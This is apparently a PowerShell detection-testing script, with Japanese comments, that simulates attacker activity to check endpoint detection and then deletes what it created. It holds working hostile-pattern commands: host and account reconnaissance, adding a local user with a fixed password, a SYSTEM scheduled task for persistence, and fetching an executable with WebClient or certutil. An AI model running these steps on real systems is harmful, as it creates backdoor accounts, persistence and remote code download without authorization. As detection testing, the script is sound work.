# EDR Test Script 3+4: System Modification and Cleanup
# 管理者権限で実行されることを前提

# ディレクトリ作成
try {
    New-Item -Path "c:\edrtest" -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
} catch {}

# 情報収集
ipconfig /all | Out-Null
arp -a | Out-Null
ping misdepatrment.com -n 1 | Out-Null
wmic useraccount get /ALL | Out-Null

# ユーザー追加
try {
    net user sh123 P@ssw0rd /add 2>$null
} catch {}

# スケジュールタスク作成
try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command ipconfig"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 1)
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    Register-ScheduledTask -TaskName "edrtest" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
} catch {}

# ファイルダウンロード
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile("https://github.com/choro511/detection-testing/raw/refs/heads/main/calc.exe", "c:\edrtest\calc.exe")
} catch {
    # certutilをフォールバック
    try {
        certutil -urlcache -split -f "https://github.com/choro511/detection-testing/raw/refs/heads/main/calc.exe" "c:\edrtest\calc.exe" 2>$null | Out-Null
    } catch {}
}

# 30秒スリープ
Start-Sleep -Seconds 30

# クリーンアップ開始
if (Test-Path "c:\edrtest") {
    try {
        Get-ChildItem -Path "c:\edrtest" -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "c:\edrtest" -Force -ErrorAction SilentlyContinue
    } catch {}
}

# スケジュールタスク削除
try {
    Unregister-ScheduledTask -TaskName "edrtest" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
} catch {}

# ユーザー削除
try {
    net user sh123 /delete 2>$null
} catch {}
